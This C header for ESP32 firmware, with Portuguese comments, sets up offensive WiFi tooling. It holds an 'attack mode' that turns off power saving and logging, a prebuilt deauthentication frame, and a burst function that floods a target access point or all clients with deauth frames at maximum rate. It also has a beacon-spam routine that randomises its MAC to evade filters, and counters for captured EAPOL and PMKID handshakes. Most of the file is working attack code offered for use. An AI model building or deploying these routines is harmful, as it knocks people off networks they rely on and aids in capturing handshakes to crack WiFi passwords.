/**
 * @file wifi_optimizations.h
 * @brief Otimizações de Performance para Ataques WiFi
 * @author Lele Origin Team
 *
 * Otimizações implementadas:
 * 1. Taxa TX configurável (1Mbps a 54Mbps)
 * 2. Power saving desativado para máxima performance
 * 3. Logs desativados durante ataques
 * 4. Buffers pré-alocados
 * 5. Callbacks IRAM_ATTR
 */

#ifndef __WIFI_OPTIMIZATIONS_H__
#define __WIFI_OPTIMIZATIONS_H__

#include <esp_wifi.h>
#include <esp_log.h>
#include <Arduino.h>

// ============================================================================
// CONFIGURAÇÕES DE TAXA TX
// ============================================================================

typedef enum {
    WIFI_TX_RATE_1M = 0,      ///< 1 Mbps - Máximo alcance
    WIFI_TX_RATE_2M,          ///< 2 Mbps
    WIFI_TX_RATE_5_5M,        ///< 5.5 Mbps
    WIFI_TX_RATE_11M,         ///< 11 Mbps - Bom equilíbrio
    WIFI_TX_RATE_6M,          ///< 6 Mbps OFDM
    WIFI_TX_RATE_9M,          ///< 9 Mbps OFDM
    WIFI_TX_RATE_12M,         ///< 12 Mbps OFDM
    WIFI_TX_RATE_18M,         ///< 18 Mbps OFDM
    WIFI_TX_RATE_24M,         ///< 24 Mbps OFDM
    WIFI_TX_RATE_36M,         ///< 36 Mbps OFDM
    WIFI_TX_RATE_48M,         ///< 48 Mbps OFDM
    WIFI_TX_RATE_54M          ///< 54 Mbps - Máxima velocidade
} wifi_tx_rate_t;

// Mapeamento para esp_wifi_config_80211_tx_rate
static const wifi_phy_rate_t tx_rate_map[] = {
    WIFI_PHY_RATE_1M_L,       // 1 Mbps
    WIFI_PHY_RATE_2M_L,       // 2 Mbps
    WIFI_PHY_RATE_5M_L,       // 5.5 Mbps
    WIFI_PHY_RATE_11M_L,      // 11 Mbps
    WIFI_PHY_RATE_6M,         // 6 Mbps OFDM
    WIFI_PHY_RATE_9M,         // 9 Mbps OFDM
    WIFI_PHY_RATE_12M,        // 12 Mbps OFDM
    WIFI_PHY_RATE_18M,        // 18 Mbps OFDM
    WIFI_PHY_RATE_24M,        // 24 Mbps OFDM
    WIFI_PHY_RATE_36M,        // 36 Mbps OFDM
    WIFI_PHY_RATE_48M,        // 48 Mbps OFDM
    WIFI_PHY_RATE_54M         // 54 Mbps OFDM
};

// ============================================================================
// FUNÇÕES DE OTIMIZAÇÃO
// ============================================================================

/**
 * @brief Ativa modo de alta performance para ataques
 * - Desativa power saving
 * - Desativa logs
 * - Configura CPU para 240MHz
 */
inline void wifi_opt_enable_attack_mode() {
    // Desativa power saving para máxima TX rate
    esp_wifi_set_ps(WIFI_PS_NONE);

    // Desativa logs (ganho de 50%+ em injection rate)
    esp_log_level_set("*", ESP_LOG_NONE);
    esp_log_level_set("wifi", ESP_LOG_NONE);

    // CPU máxima
    setCpuFrequencyMhz(240);
}

/**
 * @brief Restaura configurações normais após ataque
 */
inline void wifi_opt_disable_attack_mode() {
    // Restaura power saving moderado
    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);

    // Restaura logs
    esp_log_level_set("*", ESP_LOG_INFO);

    // CPU normal (economia de energia)
    setCpuFrequencyMhz(160);
}

/**
 * @brief Configura taxa de transmissão
 * @param rate Taxa desejada (1M a 54M)
 * @param iface Interface (WIFI_IF_STA ou WIFI_IF_AP)
 *
 * - Rates baixas (1-11M): Maior alcance, menor throughput
 * - Rates altas (24-54M): Maior throughput, menor alcance
 */
inline esp_err_t wifi_opt_set_tx_rate(wifi_tx_rate_t rate, wifi_interface_t iface = WIFI_IF_AP) {
    if (rate > WIFI_TX_RATE_54M) rate = WIFI_TX_RATE_54M;
    return esp_wifi_config_80211_tx_rate(iface, tx_rate_map[rate]);
}

/**
 * @brief Configura potência máxima de TX
 * @param power_dbm Potência em dBm (max 20.5)
 */
inline esp_err_t wifi_opt_set_max_power(int8_t power_dbm = 20) {
    // ESP32 aceita 8-84 (0.25dBm increments), 80 = 20dBm
    int8_t power_val = power_dbm * 4;
    if (power_val > 84) power_val = 84;
    if (power_val < 8) power_val = 8;
    return esp_wifi_set_max_tx_power(power_val);
}

// ============================================================================
// BUFFERS PRÉ-ALOCADOS
// ============================================================================

// Deauth frame template (evita malloc/free repetido)
static uint8_t _opt_deauth_frame[26] = {
    0xC0, 0x00,                         // Type: Deauth
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Seq
    0x07, 0x00                          // Reason: Class 3 frame
};

/**
 * @brief Envia deauth otimizado (sem delays desnecessários)
 * @param bssid BSSID do AP alvo
 * @param target MAC do cliente (ou broadcast)
 * @param count Número de frames para enviar em burst
 * @return Número de frames enviados com sucesso
 */
inline int wifi_opt_send_deauth_burst(const uint8_t* bssid, const uint8_t* target, int count = 10) {
    // Prepara frame uma vez
    memcpy(&_opt_deauth_frame[4], target, 6);   // Dest
    memcpy(&_opt_deauth_frame[10], bssid, 6);   // Source
    memcpy(&_opt_deauth_frame[16], bssid, 6);   // BSSID

    int success = 0;
    for (int i = 0; i < count; i++) {
        if (esp_wifi_80211_tx(WIFI_IF_AP, _opt_deauth_frame, 26, false) == ESP_OK) {
            success++;
        }
        // Sem delay entre frames - máxima taxa de injeção
    }
    return success;
}

/**
 * @brief Envia beacon otimizado para spam
 * @param ssid SSID do beacon
 * @param channel Canal
 * @param count Número de beacons
 */
inline int wifi_opt_send_beacon_burst(const char* ssid, uint8_t channel, int count = 10) {
    static uint8_t beacon[109];
    static uint8_t mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00};

    // Randomiza últimos bytes do MAC (evita filtros)
    mac[3] = random(256);
    mac[4] = random(256);
    mac[5] = random(256);

    // Monta beacon (função externa)
    // prepareBeaconPacket(beacon, mac, ssid, strlen(ssid), channel, true);

    int success = 0;
    for (int i = 0; i < count; i++) {
        if (esp_wifi_80211_tx(WIFI_IF_AP, beacon, 109, false) == ESP_OK) {
            success++;
        }
    }
    return success;
}

// ============================================================================
// ESTATÍSTICAS
// ============================================================================

struct WiFiAttackStats {
    uint32_t frames_sent;
    uint32_t frames_failed;
    uint32_t eapol_captured;
    uint32_t pmkid_captured;
    uint32_t start_time;
    float frames_per_second;
};

static WiFiAttackStats _wifi_stats = {0};

inline void wifi_opt_reset_stats() {
    memset(&_wifi_stats, 0, sizeof(_wifi_stats));
    _wifi_stats.start_time = millis();
}

inline void wifi_opt_update_stats() {
    uint32_t elapsed = millis() - _wifi_stats.start_time;
    if (elapsed > 0) {
        _wifi_stats.frames_per_second = (_wifi_stats.frames_sent * 1000.0f) / elapsed;
    }
}

inline WiFiAttackStats* wifi_opt_get_stats() {
    wifi_opt_update_stats();
    return &_wifi_stats;
}

// ============================================================================
// MACROS PARA CALLBACKS OTIMIZADOS
// ============================================================================

// Marca callback para rodar em IRAM (10x mais rápido)
#define WIFI_OPT_IRAM_CALLBACK IRAM_ATTR

#endif // __WIFI_OPTIMIZATIONS_H__
